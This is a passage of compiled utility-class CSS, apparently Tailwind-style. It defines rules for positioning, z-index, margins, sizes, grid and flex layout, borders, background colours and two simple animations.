            position: relative
        }

        .sticky {
            position: sticky
        }

        .inset-0 {
            top: 0;
            right: 0;
            bottom: 0;
            left: 0
        }

        .inset-x-0 {
            left: 0;
            right: 0
        }

        .\!bottom-28 {
            bottom: 7rem !important
        }

        .-bottom-1 {
            bottom: -.25rem
        }

        .-bottom-2 {
            bottom: -.5rem
        }

        .-bottom-5 {
            bottom: -1.25rem
        }

        .-left-0 {
            left: 0
        }

        .-left-11 {
            left: -2.75rem
        }

        .-left-5 {
            left: -1.25rem
        }

        .-right-0 {
            right: 0
        }

        .-right-1 {
            right: -.25rem
        }

        .-right-11 {
            right: -2.75rem
        }

        .-right-2 {
            right: -.5rem
        }

        .-right-5 {
            right: -1.25rem
        }

        .-top-1 {
            top: -.25rem
        }

        .-top-2 {
            top: -.5rem
        }

        .bottom-0 {
            bottom: 0
        }

        .bottom-2 {
            bottom: .5rem
        }

        .bottom-3 {
            bottom: .75rem
        }

        .bottom-4 {
            bottom: 1rem
        }

        .bottom-8 {
            bottom: 2rem
        }

        .bottom-\[-1px\] {
            bottom: -1px
        }

        .bottom-\[-6px\] {
            bottom: -6px
        }

        .bottom-\[calc\(100\%\+20px\)\] {
            bottom: calc(100% + 20px)
        }

        .bottom-full {
            bottom: 100%
        }

        .left-0 {
            left: 0
        }

        .left-1\/2 {
            left: 50%
        }

        .left-2 {
            left: .5rem
        }

        .left-3 {
            left: .75rem
        }

        .left-4 {
            left: 1rem
        }

        .left-5 {
            left: 1.25rem
        }

        .left-6 {
            left: 1.5rem
        }

        .left-8 {
            left: 2rem
        }

        .left-full {
            left: 100%
        }

        .right-0 {
            right: 0
        }

        .right-1\/2 {
            right: 50%
        }

        .right-12 {
            right: 3rem
        }

        .right-2 {
            right: .5rem
        }

        .right-3 {
            right: .75rem
        }

        .right-4 {
            right: 1rem
        }

        .right-5 {
            right: 1.25rem
        }

        .right-6 {
            right: 1.5rem
        }

        .right-7 {
            right: 1.75rem
        }

        .right-\[calc\(100\%-120px\)\] {
            right: calc(100% - 120px)
        }

        .right-full {
            right: 100%
        }

        .top-0 {
            top: 0
        }

        .top-1\/2 {
            top: 50%
        }

        .top-12 {
            top: 3rem
        }

        .top-14 {
            top: 3.5rem
        }

        .top-16 {
            top: 4rem
        }

        .top-2 {
            top: .5rem
        }

        .top-3 {
            top: .75rem
        }

        .top-36 {
            top: 9rem
        }

        .top-4 {
            top: 1rem
        }

        .top-5 {
            top: 1.25rem
        }

        .top-\[-1px\] {
            top: -1px
        }

        .top-\[12px\] {
            top: 12px
        }

        .top-\[14px\] {
            top: 14px
        }

        .top-\[40\%\] {
            top: 40%
        }

        .top-\[40px\] {
            top: 40px
        }

        .top-\[5px\] {
            top: 5px
        }

        .top-\[60\%\] {
            top: 60%
        }

        .top-\[90\%\] {
            top: 90%
        }

        .top-\[calc\(100\%\)\] {
            top: 100%
        }

        .top-\[calc\(100\%\+12px\)\] {
            top: calc(100% + 12px)
        }

        .top-\[calc\(100\%\+20px\)\] {
            top: calc(100% + 20px)
        }

        .top-\[calc\(100\%\+2px\)\] {
            top: calc(100% + 2px)
        }

        .top-\[calc\(100\%\+36px\)\] {
            top: calc(100% + 36px)
        }

        .top-\[calc\(100\%\+8px\)\] {
            top: calc(100% + 8px)
        }

        .top-full {
            top: 100%
        }

        .z-0 {
            z-index: 0
        }

        .z-10 {
            z-index: 10
        }

        .z-20 {
            z-index: 20
        }

        .z-30 {
            z-index: 30
        }

        .z-50 {
            z-index: 50
        }

        .z-\[-1\] {
            z-index: -1
        }

        .z-\[0\] {
            z-index: 0
        }

        .z-\[10\] {
            z-index: 10
        }

        .z-\[1\] {
            z-index: 1
        }

        .z-\[2\] {
            z-index: 2
        }

        .z-\[3\] {
            z-index: 3
        }

        .z-\[4\] {
            z-index: 4
        }

        .z-\[5\] {
            z-index: 5
        }

        .z-\[999\] {
            z-index: 999
        }

        .order-1 {
            order: 1
        }

        .col-span-1 {
            grid-column: span 1/span 1
        }

        .col-span-2 {
            grid-column: span 2/span 2
        }

        .col-span-3 {
            grid-column: span 3/span 3
        }

        .col-span-4 {
            grid-column: span 4/span 4
        }

        .col-span-5 {
            grid-column: span 5/span 5
        }

        .col-span-6 {
            grid-column: span 6/span 6
        }

        .col-span-full {
            grid-column: 1/-1
        }

        .m-auto {
            margin: auto
        }

        .mx-5 {
            margin-left: 1.25rem;
            margin-right: 1.25rem
        }

        .mx-8 {
            margin-left: 2rem;
            margin-right: 2rem
        }

        .mx-auto {
            margin-left: auto;
            margin-right: auto
        }

        .my-1 {
            margin-bottom: .25rem;
            margin-top: .25rem
        }

        .my-20 {
            margin-bottom: 5rem;
            margin-top: 5rem
        }

        .my-3 {
            margin-bottom: .75rem;
            margin-top: .75rem
        }

        .my-auto {
            margin-bottom: auto;
            margin-top: auto
        }

        .mb-1 {
            margin-bottom: .25rem
        }

        .mb-2 {
            margin-bottom: .5rem
        }

        .mb-4 {
            margin-bottom: 1rem
        }

        .mb-6 {
            margin-bottom: 1.5rem
        }

        .mb-8 {
            margin-bottom: 2rem
        }

        .mb-auto {
            margin-bottom: auto
        }

        .ml-\[7px\] {
            margin-left: 7px
        }

        .ml-auto {
            margin-left: auto
        }

        .mr-1 {
            margin-right: .25rem
        }

        .mr-2 {
            margin-right: .5rem
        }

        .mr-3 {
            margin-right: .75rem
        }

        .mr-8 {
            margin-right: 2rem
        }

        .mr-auto {
            margin-right: auto
        }

        .mt-1 {
            margin-top: .25rem
        }

        .mt-2 {
            margin-top: .5rem
        }

        .mt-24 {
            margin-top: 6rem
        }

        .mt-3 {
            margin-top: .75rem
        }

        .mt-32 {
            margin-top: 8rem
        }

        .mt-4 {
            margin-top: 1rem
        }

        .mt-\[128px\] {
            margin-top: 128px
        }

        .mt-\[550px\] {
            margin-top: 550px
        }

        .mt-\[66px\] {
            margin-top: 66px
        }

        .mt-\[75px\] {
            margin-top: 75px
        }

        .mt-auto {
            margin-top: auto
        }

        .box-content {
            box-sizing: content-box
        }

        .block {
            display: block
        }

        .flex {
            display: flex
        }

        .inline-flex {
            display: inline-flex
        }

        .table {
            display: table
        }

        .grid {
            display: grid
        }

        .hidden {
            display: none
        }

        .aspect-4\/3 {
            aspect-ratio: 4/3
        }

        .aspect-\[11\/6\] {
            aspect-ratio: 11/6
        }

        .aspect-\[3\.2\/1\] {
            aspect-ratio: 3.2/1
        }

        .aspect-\[3\/1\] {
            aspect-ratio: 3/1
        }

        .aspect-\[5\/3\] {
            aspect-ratio: 5/3
        }

        .aspect-square {
            aspect-ratio: 1/1
        }

        .aspect-video {
            aspect-ratio: 16/9
        }

        .\!size-4 {
            height: 1rem !important;
            width: 1rem !important
        }

        .\!size-8 {
            height: 2rem !important;
            width: 2rem !important
        }

        .size-10 {
            height: 2.5rem;
            width: 2.5rem
        }

        .size-12 {
            height: 3rem;
            width: 3rem
        }

        .size-14 {
            height: 3.5rem;
            width: 3.5rem
        }

        .size-16 {
            height: 4rem;
            width: 4rem
        }

        .size-2 {
            height: .5rem;
            width: .5rem
        }

        .size-20 {
            height: 5rem;
            width: 5rem
        }

        .size-24 {
            height: 6rem;
            width: 6rem
        }

        .size-3 {
            height: .75rem;
            width: .75rem
        }

        .size-4 {
            height: 1rem;
            width: 1rem
        }

        .size-5 {
            height: 1.25rem;
            width: 1.25rem
        }

        .size-6 {
            height: 1.5rem;
            width: 1.5rem
        }

        .size-8 {
            height: 2rem;
            width: 2rem
        }

        .size-\[10px\] {
            height: 10px;
            width: 10px
        }

        .size-\[150px\] {
            height: 150px;
            width: 150px
        }

        .size-\[16px\] {
            height: 16px;
            width: 16px
        }

        .size-\[30px\] {
            height: 30px;
            width: 30px
        }

        .size-\[360px\] {
            height: 360px;
            width: 360px
        }

        .size-\[7px\] {
            height: 7px;
            width: 7px
        }

        .\!h-10 {
            height: 2.5rem !important
        }

        .\!h-7 {
            height: 1.75rem !important
        }

        .\!h-8 {
            height: 2rem !important
        }

        .\!h-\[34px\] {
            height: 34px !important
        }

        .\!h-auto {
            height: auto !important
        }

        .h-0 {
            height: 0
        }

        .h-1 {
            height: .25rem
        }

        .h-10 {
            height: 2.5rem
        }

        .h-11 {
            height: 2.75rem
        }

        .h-12 {
            height: 3rem
        }

        .h-14 {
            height: 3.5rem
        }

        .h-16 {
            height: 4rem
        }

        .h-2 {
            height: .5rem
        }

        .h-20 {
            height: 5rem
        }

        .h-24 {
            height: 6rem
        }

        .h-28 {
            height: 7rem
        }

        .h-3 {
            height: .75rem
        }

        .h-32 {
            height: 8rem
        }

        .h-36 {
            height: 9rem
        }

        .h-4 {
            height: 1rem
        }

        .h-40 {
            height: 10rem
        }

        .h-44 {
            height: 11rem
        }

        .h-48 {
            height: 12rem
        }

        .h-5 {
            height: 1.25rem
        }

        .h-52 {
            height: 13rem
        }

        .h-56 {
            height: 14rem
        }

        .h-6 {
            height: 1.5rem
        }

        .h-64 {
            height: 16rem
        }

        .h-7 {
            height: 1.75rem
        }

        .h-72 {
            height: 18rem
        }

        .h-8 {
            height: 2rem
        }

        .h-80 {
            height: 20rem
        }

        .h-9 {
            height: 2.25rem
        }

        .h-96 {
            height: 24rem
        }

        .h-\[100px\] {
            height: 100px
        }

        .h-\[102px\] {
            height: 102px
        }

        .h-\[105px\] {
            height: 105px
        }

        .h-\[150px\] {
            height: 150px
        }

        .h-\[152px\] {
            height: 152px
        }

        .h-\[22px\] {
            height: 22px
        }

        .h-\[250px\] {
            height: 250px
        }

        .h-\[300px\] {
            height: 300px
        }

        .h-\[336px\] {
            height: 336px
        }

        .h-\[360px\] {
            height: 360px
        }

        .h-\[400px\] {
            height: 400px
        }

        .h-\[42px\] {
            height: 42px
        }

        .h-\[450px\] {
            height: 450px
        }

        .h-\[500px\] {
            height: 500px
        }

        .h-\[51px\] {
            height: 51px
        }

        .h-\[60vh\] {
            height: 60vh
        }

        .h-\[70vh\] {
            height: 70vh
        }

        .h-\[780px\] {
            height: 780px
        }

        .h-\[7px\] {
            height: 7px
        }

        .h-\[80\%\] {
            height: 80%
        }

        .h-\[80px\] {
            height: 80px
        }

        .h-\[80vh\] {
            height: 80vh
        }

        .h-\[calc\(100\%-5rem\)\] {
            height: calc(100% - 5rem)
        }

        .h-\[calc\(100\%-66px\)\] {
            height: calc(100% - 66px)
        }

        .h-\[calc\(100vh-128px\)\] {
            height: calc(100vh - 128px)
        }

        .h-\[calc\(100vh-72px\)\] {
            height: calc(100vh - 72px)
        }

        .h-full {
            height: 100%
        }

        .h-screen {
            height: 100vh
        }

        .max-h-\[1500px\] {
            max-height: 1500px
        }

        .max-h-\[200px\] {
            max-height: 200px
        }

        .max-h-\[360px\] {
            max-height: 360px
        }

        .max-h-\[400px\] {
            max-height: 400px
        }

        .max-h-\[42px\] {
            max-height: 42px
        }

        .max-h-\[45vh\] {
            max-height: 45vh
        }

        .max-h-\[460px\] {
            max-height: 460px
        }

        .max-h-\[475px\] {
            max-height: 475px
        }

        .max-h-\[500px\] {
            max-height: 500px
        }

        .max-h-\[50vh\] {
            max-height: 50vh
        }

        .max-h-\[55vh\] {
            max-height: 55vh
        }

        .max-h-\[600px\] {
            max-height: 600px
        }

        .max-h-\[60vh\] {
            max-height: 60vh
        }

        .max-h-\[70vh\] {
            max-height: 70vh
        }

        .min-h-96 {
            min-height: 24rem
        }

        .min-h-\[250px\] {
            min-height: 250px
        }

        .min-h-\[270px\] {
            min-height: 270px
        }

        .min-h-\[307px\] {
            min-height: 307px
        }

        .min-h-\[70px\] {
            min-height: 70px
        }

        .min-h-\[70vh\] {
            min-height: 70vh
        }

        .min-h-\[75vh\] {
            min-height: 75vh
        }

        .min-h-\[85vh\] {
            min-height: 85vh
        }

        .min-h-screen {
            min-height: 100vh
        }

        .\!w-full {
            width: 100% !important
        }

        .w-0 {
            width: 0
        }

        .w-1 {
            width: .25rem
        }

        .w-1\/2 {
            width: 50%
        }

        .w-1\/3 {
            width: 33.333333%
        }

        .w-10 {
            width: 2.5rem
        }

        .w-11\/12 {
            width: 91.666667%
        }

        .w-12 {
            width: 3rem
        }

        .w-16 {
            width: 4rem
        }

        .w-2\/3 {
            width: 66.666667%
        }

        .w-20 {
            width: 5rem
        }

        .w-28 {
            width: 7rem
        }

        .w-32 {
            width: 8rem
        }

        .w-4 {
            width: 1rem
        }

        .w-5 {
            width: 1.25rem
        }

        .w-5\/6 {
            width: 83.333333%
        }

        .w-56 {
            width: 14rem
        }

        .w-6 {
            width: 1.5rem
        }

        .w-8 {
            width: 2rem
        }

        .w-80 {
            width: 20rem
        }

        .w-9 {
            width: 2.25rem
        }

        .w-\[0\.5px\] {
            width: .5px
        }

        .w-\[1px\] {
            width: 1px
        }

        .w-\[21px\] {
            width: 21px
        }

        .w-\[250px\] {
            width: 250px
        }

        .w-\[80\%\] {
            width: 80%
        }

        .w-\[98px\] {
            width: 98px
        }

        .w-fit {
            width: -moz-fit-content;
            width: fit-content
        }

        .w-full {
            width: 100%
        }

        .w-screen {
            width: 100vw
        }

        .min-w-20 {
            min-width: 5rem
        }

        .min-w-36 {
            min-width: 9rem
        }

        .min-w-44 {
            min-width: 11rem
        }

        .min-w-56 {
            min-width: 14rem
        }

        .min-w-60 {
            min-width: 15rem
        }

        .min-w-64 {
            min-width: 16rem
        }

        .min-w-72 {
            min-width: 18rem
        }

        .min-w-\[460px\] {
            min-width: 460px
        }

        .min-w-\[50\%\] {
            min-width: 50%
        }

        .max-w-2xl {
            max-width: 42rem
        }

        .max-w-32 {
            max-width: 8rem
        }

        .max-w-3xl {
            max-width: 48rem
        }

        .max-w-4xl {
            max-width: 56rem
        }

        .max-w-80 {
            max-width: 20rem
        }

        .max-w-\[200px\] {
            max-width: 200px
        }

        .max-w-\[50\%\] {
            max-width: 50%
        }

        .max-w-\[80\%\] {
            max-width: 80%
        }

        .max-w-\[85vw\] {
            max-width: 85vw
        }

        .max-w-\[90vw\] {
            max-width: 90vw
        }

        .max-w-md {
            max-width: 28rem
        }

        .max-w-sm {
            max-width: 24rem
        }

        .max-w-xl {
            max-width: 36rem
        }

        .flex-1 {
            flex: 1 1 0%
        }

        .shrink-0 {
            flex-shrink: 0
        }

        .-translate-x-1\/2 {
            --tw-translate-x: -50%
        }

        .-translate-x-1\/2,
        .-translate-y-1\/2 {
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .-translate-y-1\/2 {
            --tw-translate-y: -50%
        }

        .-translate-y-\[1px\] {
            --tw-translate-y: -1px
        }

        .-translate-y-\[1px\],
        .translate-x-1\/2 {
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .translate-x-1\/2 {
            --tw-translate-x: 50%
        }

        .translate-y-\[1px\] {
            --tw-translate-y: 1px
        }

        .-rotate-90,
        .translate-y-\[1px\] {
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .-rotate-90 {
            --tw-rotate: -90deg
        }

        .rotate-180 {
            --tw-rotate: 180deg
        }

        .rotate-180,
        .rotate-90 {
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .rotate-90 {
            --tw-rotate: 90deg
        }

        .rotate-\[135deg\] {
            --tw-rotate: 135deg
        }

        .rotate-\[135deg\],
        .scale-\[0\.65\] {
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .scale-\[0\.65\] {
            --tw-scale-x: .65;
            --tw-scale-y: .65
        }

        .scale-\[94\%\] {
            --tw-scale-x: 94%;
            --tw-scale-y: 94%;
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        @keyframes pulse {
            50% {
                opacity: .5
            }
        }

        .animate-pulse {
            animation: pulse 2s cubic-bezier(.4, 0, .6, 1) infinite
        }

        @keyframes spin {
            to {
                transform: rotate(1turn)
            }
        }

        .animate-spin {
            animation: spin 1s linear infinite
        }

        .cursor-default {
            cursor: default
        }

        .cursor-pointer {
            cursor: pointer
        }

        .select-none {
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none
        }

        .resize {
            resize: both
        }

        .scroll-mt-24 {
            scroll-margin-top: 6rem
        }

        .scroll-mt-52 {
            scroll-margin-top: 13rem
        }

        .list-decimal {
            list-style-type: decimal
        }

        .grid-flow-col {
            grid-auto-flow: column
        }

        .grid-cols-2 {
            grid-template-columns: repeat(2, minmax(0, 1fr))
        }

        .grid-cols-3 {
            grid-template-columns: repeat(3, minmax(0, 1fr))
        }

        .grid-cols-4 {
            grid-template-columns: repeat(4, minmax(0, 1fr))
        }

        .grid-cols-5 {
            grid-template-columns: repeat(5, minmax(0, 1fr))
        }

        .grid-cols-6 {
            grid-template-columns: repeat(6, minmax(0, 1fr))
        }

        .grid-cols-8 {
            grid-template-columns: repeat(8, minmax(0, 1fr))
        }

        .grid-rows-5 {
            grid-template-rows: repeat(5, minmax(0, 1fr))
        }

        .grid-rows-\[0fr\] {
            grid-template-rows: 0fr
        }

        .grid-rows-\[1fr\] {
            grid-template-rows: 1fr
        }

        .\!flex-row {
            flex-direction: row !important
        }

        .flex-row {
            flex-direction: row
        }

        .flex-col {
            flex-direction: column
        }

        .flex-col-reverse {
            flex-direction: column-reverse
        }

        .flex-wrap {
            flex-wrap: wrap
        }

        .items-start {
            align-items: flex-start
        }

        .items-end {
            align-items: flex-end
        }

        .items-center {
            align-items: center
        }

        .justify-start {
            justify-content: flex-start
        }

        .justify-end {
            justify-content: flex-end
        }

        .justify-center {
            justify-content: center
        }

        .justify-between {
            justify-content: space-between
        }

        .\!gap-2 {
            gap: .5rem !important
        }

        .gap-1 {
            gap: .25rem
        }

        .gap-10 {
            gap: 2.5rem
        }

        .gap-12 {
            gap: 3rem
        }

        .gap-2 {
            gap: .5rem
        }

        .gap-3 {
            gap: .75rem
        }

        .gap-4 {
            gap: 1rem
        }

        .gap-5 {
            gap: 1.25rem
        }

        .gap-6 {
            gap: 1.5rem
        }

        .gap-7 {
            gap: 1.75rem
        }

        .gap-8 {
            gap: 2rem
        }

        .gap-\[6px\] {
            gap: 6px
        }

        .\!gap-x-2 {
            -moz-column-gap: .5rem !important;
            column-gap: .5rem !important
        }

        .gap-x-3 {
            -moz-column-gap: .75rem;
            column-gap: .75rem
        }

        .gap-x-4 {
            -moz-column-gap: 1rem;
            column-gap: 1rem
        }

        .gap-x-6 {
            -moz-column-gap: 1.5rem;
            column-gap: 1.5rem
        }

        .gap-y-2 {
            row-gap: .5rem
        }

        .gap-y-3 {
            row-gap: .75rem
        }

        .gap-y-4 {
            row-gap: 1rem
        }

        .divide-x>:not([hidden])~:not([hidden]) {
            --tw-divide-x-reverse: 0;
            border-left-width: calc(1px*(1 - var(--tw-divide-x-reverse)));
            border-right-width: calc(1px*var(--tw-divide-x-reverse))
        }

        .divide-y>:not([hidden])~:not([hidden]) {
            --tw-divide-y-reverse: 0;
            border-bottom-width: calc(1px*var(--tw-divide-y-reverse));
            border-top-width: calc(1px*(1 - var(--tw-divide-y-reverse)))
        }

        .divide-bw-100>:not([hidden])~:not([hidden]) {
            --tw-divide-opacity: 1;
            border-color: rgb(242 242 242/var(--tw-divide-opacity, 1))
        }

        .self-start {
            align-self: flex-start
        }

        .self-end {
            align-self: flex-end
        }

        .self-center {
            align-self: center
        }

        .self-stretch {
            align-self: stretch
        }

        .overflow-auto {
            overflow: auto
        }

        .overflow-hidden {
            overflow: hidden
        }

        .overflow-x-auto {
            overflow-x: auto
        }

        .overflow-y-auto {
            overflow-y: auto
        }

        .overflow-x-hidden {
            overflow-x: hidden
        }

        .overflow-y-hidden {
            overflow-y: hidden
        }

        .whitespace-normal {
            white-space: normal
        }

        .whitespace-nowrap {
            white-space: nowrap
        }

        .text-wrap {
            text-wrap: wrap
        }

        .\!text-nowrap {
            text-wrap: nowrap !important
        }

        .text-nowrap {
            text-wrap: nowrap
        }

        .text-balance {
            text-wrap: balance
        }

        .break-all {
            word-break: break-all
        }

        .\!rounded-3xl {
            border-radius: 1.5rem !important
        }

        .\!rounded-full {
            border-radius: 9999px !important
        }

        .\!rounded-lg {
            border-radius: .5rem !important
        }

        .\!rounded-none {
            border-radius: 0 !important
        }

        .\!rounded-xl {
            border-radius: .75rem !important
        }

        .rounded {
            border-radius: .25rem
        }

        .rounded-2xl {
            border-radius: 1rem
        }

        .rounded-3xl {
            border-radius: 1.5rem
        }

        .rounded-full {
            border-radius: 9999px
        }

        .rounded-lg {
            border-radius: .5rem
        }

        .rounded-md {
            border-radius: .375rem
        }

        .rounded-sm {
            border-radius: .125rem
        }

        .rounded-xl {
            border-radius: .75rem
        }

        .rounded-b-full {
            border-bottom-left-radius: 9999px;
            border-bottom-right-radius: 9999px
        }

        .rounded-l-3xl {
            border-bottom-left-radius: 1.5rem;
            border-top-left-radius: 1.5rem
        }

        .rounded-l-full {
            border-bottom-left-radius: 9999px;
            border-top-left-radius: 9999px
        }

        .rounded-r-3xl {
            border-bottom-right-radius: 1.5rem;
            border-top-right-radius: 1.5rem
        }

        .rounded-t-2xl {
            border-top-left-radius: 1rem;
            border-top-right-radius: 1rem
        }

        .rounded-t-3xl {
            border-top-left-radius: 1.5rem;
            border-top-right-radius: 1.5rem
        }

        .rounded-t-full {
            border-top-left-radius: 9999px;
            border-top-right-radius: 9999px
        }

        .rounded-t-xl {
            border-top-left-radius: .75rem;
            border-top-right-radius: .75rem
        }

        .rounded-tl-3xl {
            border-top-left-radius: 1.5rem
        }

        .rounded-tr-3xl {
            border-top-right-radius: 1.5rem
        }

        .\!border-2 {
            border-width: 2px !important
        }

        .border {
            border-width: 1px
        }

        .border-0 {
            border-width: 0
        }

        .border-2 {
            border-width: 2px
        }

        .border-4 {
            border-width: 4px
        }

        .border-x-0 {
            border-left-width: 0;
            border-right-width: 0
        }

        .border-b {
            border-bottom-width: 1px
        }

        .border-b-2 {
            border-bottom-width: 2px
        }

        .border-b-4 {
            border-bottom-width: 4px
        }

        .border-b-\[10px\] {
            border-bottom-width: 10px
        }

        .border-b-\[18px\] {
            border-bottom-width: 18px
        }

        .border-b-\[20px\] {
            border-bottom-width: 20px
        }

        .border-l {
            border-left-width: 1px
        }

        .border-l-4 {
            border-left-width: 4px
        }

        .border-l-\[10px\] {
            border-left-width: 10px
        }

        .border-l-\[5px\] {
            border-left-width: 5px
        }

        .border-l-\[9px\] {
            border-left-width: 9px
        }

        .border-r {
            border-right-width: 1px
        }

        .border-r-\[10px\] {
            border-right-width: 10px
        }

        .border-r-\[5px\] {
            border-right-width: 5px
        }

        .border-r-\[9px\] {
            border-right-width: 9px
        }

        .border-t {
            border-top-width: 1px
        }

        .border-t-0 {
            border-top-width: 0
        }

        .border-dashed {
            border-style: dashed
        }

        .border-none {
            border-style: none
        }

        .\!border-blue-400 {
            --tw-border-opacity: 1 !important;
            border-color: rgb(96 165 250/var(--tw-border-opacity, 1)) !important
        }

        .\!border-danger-main {
            --tw-border-opacity: 1 !important;
            border-color: rgb(236 33 61/var(--tw-border-opacity, 1)) !important
        }

        .\!border-primary {
            --tw-border-opacity: 1 !important;
            border-color: rgb(0 90 171/var(--tw-border-opacity, 1)) !important
        }

        .\!border-success-main {
            --tw-border-opacity: 1 !important;
            border-color: rgb(29 153 120/var(--tw-border-opacity, 1)) !important
        }

        .border-\[\#0F62FE\] {
            --tw-border-opacity: 1;
            border-color: rgb(15 98 254/var(--tw-border-opacity, 1))
        }

        .border-\[\#1890FF\] {
            --tw-border-opacity: 1;
            border-color: rgb(24 144 255/var(--tw-border-opacity, 1))
        }

        .border-\[\#6E6E6E\] {
            --tw-border-opacity: 1;
            border-color: rgb(110 110 110/var(--tw-border-opacity, 1))
        }

        .border-\[\#9DC0EE\] {
            --tw-border-opacity: 1;
            border-color: rgb(157 192 238/var(--tw-border-opacity, 1))
        }

        .border-\[\#B3B3B3\] {
            --tw-border-opacity: 1;
            border-color: rgb(179 179 179/var(--tw-border-opacity, 1))
        }

        .border-\[\#C6C6C6\] {
            --tw-border-opacity: 1;
            border-color: rgb(198 198 198/var(--tw-border-opacity, 1))
        }

        .border-\[\#D1D1D1\] {
            --tw-border-opacity: 1;
            border-color: rgb(209 209 209/var(--tw-border-opacity, 1))
        }

        .border-\[\#D9D9D9\] {
            --tw-border-opacity: 1;
            border-color: rgb(217 217 217/var(--tw-border-opacity, 1))
        }

        .border-black {
            --tw-border-opacity: 1;
            border-color: rgb(0 0 0/var(--tw-border-opacity, 1))
        }

        .border-blue-400 {
            --tw-border-opacity: 1;
            border-color: rgb(96 165 250/var(--tw-border-opacity, 1))
        }

        .border-bw-100 {
            --tw-border-opacity: 1;
            border-color: rgb(242 242 242/var(--tw-border-opacity, 1))
        }

        .border-bw-200 {
            --tw-border-opacity: 1;
            border-color: rgb(207 207 207/var(--tw-border-opacity, 1))
        }

        .border-bw-400 {
            --tw-border-opacity: 1;
            border-color: rgb(158 158 158/var(--tw-border-opacity, 1))
        }

        .border-bw-500 {
            --tw-border-opacity: 1;
            border-color: rgb(134 134 134/var(--tw-border-opacity, 1))
        }

        .border-bw-600 {
            --tw-border-opacity: 1;
            border-color: rgb(110 110 110/var(--tw-border-opacity, 1))
        }

        .border-danger-border {
            --tw-border-opacity: 1;
            border-color: rgb(255 128 128/var(--tw-border-opacity, 1))
        }

        .border-danger-main {
            --tw-border-opacity: 1;
            border-color: rgb(236 33 61/var(--tw-border-opacity, 1))
        }

        .border-gray-200 {
            --tw-border-opacity: 1;
            border-color: rgb(229 231 235/var(--tw-border-opacity, 1))
        }

        .border-primary {
            --tw-border-opacity: 1;
            border-color: rgb(0 90 171/var(--tw-border-opacity, 1))
        }

        .border-primary-200 {
            --tw-border-opacity: 1;
            border-color: rgb(204 222 238/var(--tw-border-opacity, 1))
        }

        .border-success-main {
            --tw-border-opacity: 1;
            border-color: rgb(29 153 120/var(--tw-border-opacity, 1))
        }

        .border-transparent {
            border-color: transparent
        }

        .border-warning-border {
            --tw-border-opacity: 1;
            border-color: rgb(247 217 164/var(--tw-border-opacity, 1))
        }

        .border-warning-main {
            --tw-border-opacity: 1;
            border-color: rgb(247 166 51/var(--tw-border-opacity, 1))
        }

        .border-white {
            --tw-border-opacity: 1;
            border-color: rgb(255 255 255/var(--tw-border-opacity, 1))
        }

        .border-l-transparent {
            border-left-color: transparent
        }

        .border-r-transparent {
            border-right-color: transparent
        }

        .border-t-primary-600 {
            --tw-border-opacity: 1;
            border-top-color: rgb(102 156 205/var(--tw-border-opacity, 1))
        }

        .border-opacity-90 {
            --tw-border-opacity: .9
        }

        .\!bg-danger-main {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(236 33 61/var(--tw-bg-opacity, 1)) !important
        }

        .\!bg-danger-surface {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(249 188 197/var(--tw-bg-opacity, 1)) !important
        }

        .\!bg-primary {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1)) !important
        }

        .\!bg-success-main {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(29 153 120/var(--tw-bg-opacity, 1)) !important
        }

        .\!bg-success-surface {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(142 204 187/var(--tw-bg-opacity, 1)) !important
        }

        .\!bg-transparent {
            background-color: transparent !important
        }

        .\!bg-warning-main {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(247 166 51/var(--tw-bg-opacity, 1)) !important
        }

        .\!bg-warning-surface {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(253 228 194/var(--tw-bg-opacity, 1)) !important
        }

        .\!bg-white {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(255 255 255/var(--tw-bg-opacity, 1)) !important
        }

        .bg-\[\#4c4c4c\] {
            --tw-bg-opacity: 1;
            background-color: rgb(76 76 76/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#818181\] {
            --tw-bg-opacity: 1;
            background-color: rgb(129 129 129/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#D9D9D9\] {
            --tw-bg-opacity: 1;
            background-color: rgb(217 217 217/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#E2FFF7\] {
            --tw-bg-opacity: 1;
            background-color: rgb(226 255 247/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#E5EBF180\] {
            background-color: #e5ebf180
        }

        .bg-\[\#E6EFF6\] {
            --tw-bg-opacity: 1;
            background-color: rgb(230 239 246/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#EEF4FC\] {
            --tw-bg-opacity: 1;
            background-color: rgb(238 244 252/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#F3F6FB\] {
            --tw-bg-opacity: 1;
            background-color: rgb(243 246 251/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#F5F5F5\] {
            --tw-bg-opacity: 1;
            background-color: rgb(245 245 245/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#F6FFF9\] {
            --tw-bg-opacity: 1;
